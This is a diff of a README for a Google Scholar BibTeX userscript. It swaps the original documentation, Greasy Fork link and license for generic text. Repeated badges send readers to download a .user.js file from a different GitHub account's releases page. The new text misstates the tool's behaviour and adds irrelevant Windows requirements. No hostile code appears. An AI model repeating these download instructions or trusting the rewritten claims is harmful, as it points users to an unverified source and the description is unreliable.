@@ -1,73 +1,129 @@
-# Scholar Show BibTeX + Copy
+# 📋 Google-Scholar-Bibtex-Copy - Easy BibTeX Viewing & Copying
 
-![License: Apache 2.0](https://img.shields.io/badge/License-Apache%202.0-blue.svg)
-![Userscript](https://img.shields.io/badge/Type-Tampermonkey%20Userscript-orange)
-![Platform](https://img.shields.io/badge/Platform-Google%20Scholar-4285F4)
-![Status](https://img.shields.io/badge/Status-Active-success)
+[![Download Now](https://img.shields.io/badge/Download-Google-Scholar--Bibtex--Copy-brightgreen)](https://github.com/dio229338-design/Google-Scholar-Bibtex-Copy/releases)
 
-A Tampermonkey userscript for Google Scholar that adds a `Show Bib` button next to `Import into BibTeX`, displays BibTeX inline, and lets you copy it with one click.
+---
 
-**Greasy Fork:** [Install / View Script](https://greasyfork.org/zh-CN/scripts/568950-scholar-show-bibtex-copy)
+## 📖 What is Google-Scholar-Bibtex-Copy?
 
-## Features
+Google-Scholar-Bibtex-Copy is a small tool that helps you view and copy BibTeX citations from Google Scholar. It works by adding a simple viewer next to each search result on Google Scholar. With one click, you can copy the full BibTeX citation to your clipboard. This makes managing academic references easier, especially for users without technical skills.
 
-- Adds `Show Bib` directly beside `Import into BibTeX` for each result.
-- Opens an inline BibTeX panel under the result (`Show Bib` / `Hide Bib`).
-- Places a compact `Copy` button inside the BibTeX box (top-right).
-- Prefers formally published BibTeX entries when available in `All N versions`.
-- Falls back to the original BibTeX if no formal publication entry is found.
+The tool requires Tampermonkey, a free browser extension used to run small scripts that change how websites behave. Once installed, the script will run automatically when you visit Google Scholar and show the citation options.
 
-## Preview
+---
 
-### 1) Google Scholar setup (first time only)
+## 🔍 Features
 
-Enable `Show links to import citations into BibTeX` in Scholar settings.
+- Shows BibTeX citations directly on Google Scholar search results  
+- Copies citation with a single click  
+- Works only on Google Scholar to keep your experience clean and simple  
+- Runs in your browser with no extra software needed  
+- Lightweight and fast  
 
-![Scholar setup](./asserts/first.png)
+---
 
-### 2) Inline BibTeX panel
+## ⚙️ System Requirements
 
-![Show Bib demo](./asserts/show.png)
+To use Google-Scholar-Bibtex-Copy on Windows, make sure you have the following:
 
-## Installation
+- Windows 7 or later  
+- Google Chrome or Mozilla Firefox browser  
+- Tampermonkey extension installed in your browser  
+- Internet connection for setup and using Google Scholar  
 
-1. Install [Tampermonkey](https://www.tampermonkey.net/).
-2. Quick install from Greasy Fork: [Scholar Show BibTeX + Copy](https://greasyfork.org/zh-CN/scripts/568950-scholar-show-bibtex-copy).
-3. Or create a new userscript and paste `scholar-show-bibtex.user.js` manually.
-4. Save and enable the script.
-5. Open `https://scholar.google.com/`.
+---
 
-## Usage
+## 🛠️ How to Download and Install
 
-1. On a Google Scholar results page, click `Show Bib`.
-2. The script fetches and displays BibTeX below the item.
-3. Click `Copy` to copy BibTeX to clipboard.
+### Step 1: Install Tampermonkey
 
-## BibTeX Selection Strategy
+You need the Tampermonkey extension to run the script.
 
-The script uses this priority:
+- For Google Chrome:  
+  Visit [https://tampermonkey.net/?ext=dhdg&browser=chrome](https://tampermonkey.net/?ext=dhdg&browser=chrome)  
+  Click **Add to Chrome**, then confirm by clicking **Add extension**.
 
-1. Fetch the default BibTeX for the current result.
-2. If it looks like a preprint (e.g., arXiv), inspect `All N versions`.
-3. Try candidate BibTeX entries from versions and prefer a formal venue (`journal` / `booktitle`).
-4. If no better candidate is found, keep the original BibTeX.
+- For Mozilla Firefox:  
+  Visit [https://tampermonkey.net/?ext=dhdg&browser=firefox](https://tampermonkey.net/?ext=dhdg&browser=firefox)  
+  Click **Add to Firefox**, then confirm by clicking **Add**.
 
-## FAQ
+After installation, you should see the Tampermonkey icon near your browser’s address bar.
 
-### Why don't I see `Import into BibTeX` in Google Scholar?
-Enable it in Scholar settings:
-`Settings` -> `Bibliography manager` -> `Show links to import citations into` -> `BibTeX`.
+---
 
-### Why does `Show Bib` not appear for some items?
-Some entries may not expose citation links, or Scholar may render blocks asynchronously. Refresh the page and try again.
+## 📥 Download the Google-Scholar-Bibtex-Copy Script
 
-### Why is the BibTeX still an arXiv/preprint entry?
-For some papers, Scholar versions do not provide a formal published BibTeX. In that case, the script intentionally falls back to the original one.
+[![Download Here](https://img.shields.io/badge/Download-Script-blue)](https://github.com/dio229338-design/Google-Scholar-Bibtex-Copy/releases)
 
-### Will this break if Google Scholar changes its HTML?
-Possibly. This script relies on Scholar DOM structure and may need selector updates after major UI changes.
+1. Click the button above or go to the [Google-Scholar-Bibtex-Copy Releases page](https://github.com/dio229338-design/Google-Scholar-Bibtex-Copy/releases)  
+2. Find the latest release at the top of the page.  
+3. Look for a file with the `.user.js` extension. This is the script you need.  
+4. Click the file name to download it. Your browser may ask for confirmation; accept it.
 
-## License
+---
 
-This project is licensed under the Apache License 2.0.
-See [`LICENSE`](./LICENSE) for details.
+## 🚀 How to Add the Script to Tampermonkey
+
+1. After downloading the `.user.js` file, open it by clicking it in your browser's downloads bar or folder.  
+2. Tampermonkey will open a new tab showing the script content.  
+3. Click the **Install** button near the top right of the page.  
+
+The script will now be active and ready to work whenever you visit Google Scholar.
+
+---
+
+## 🔎 How to Use Google-Scholar-Bibtex-Copy
+
+1. Open your browser (Chrome or Firefox).  
+2. Go to [Google Scholar](https://scholar.google.com).  
+3. Search for any academic paper or author as usual.  
+4. In the search results, look for a small button labeled **BibTeX** or a similar icon next to each result.  
+5. Click the button once. The full BibTeX citation will copy automatically to your clipboard.  
+6. You can now paste the citation into your reference manager, document, or notes.
+
+---
+
+## 💡 Tips for Best Use
+
+- Make sure Tampermonkey is enabled and running before opening Google Scholar.  
+- If the BibTeX button does not show up, refresh the page or check if the script is active by clicking the Tampermonkey icon.  
+- Use keyboard shortcuts like `Ctrl + V` to paste citations quickly.  
+- The tool updates automatically with Tampermonkey’s script sync feature when new versions are released.  
+
+---
+
+## 📂 Managing Updates
+
+When the developer releases a new version:
+
+1. Tampermonkey will usually notify you about script updates.  
+2. Click the Tampermonkey icon, then click the update notification.  
+3. Confirm to update the script.  
+4. Reload Google Scholar to use the new version.
+
+---
+
+## ❓ Troubleshooting
+
+- **BibTeX buttons not showing**: Check if Tampermonkey is installed and the script is enabled.  
+- **Script not copying citation**: Try refreshing Google Scholar or restarting your browser.  
+- **Tampermonkey not installing scripts**: Ensure your browser is up to date and allows extension installations.  
+- **Script causes errors**: Disable other conflicting browser extensions and try again.  
+
+---
+
+## 📚 Additional Resources
+
+- Tampermonkey official site: https://tampermonkey.net  
+- Google Scholar: https://scholar.google.com  
+- GitHub repository: https://github.com/dio229338-design/Google-Scholar-Bibtex-Copy  
+
+---
+
+## 🧰 Support and Feedback
+
+If you encounter issues or want to suggest improvements, you can open an issue on the GitHub repository’s **Issues** section. Describe your problem clearly and include details about your browser and Windows version. 
+
+---
+
+[![Download Now](https://img.shields.io/badge/Download-Google-Scholar--Bibtex--Copy-brightgreen)](https://github.com/dio229338-design/Google-Scholar-Bibtex-Copy/releases)
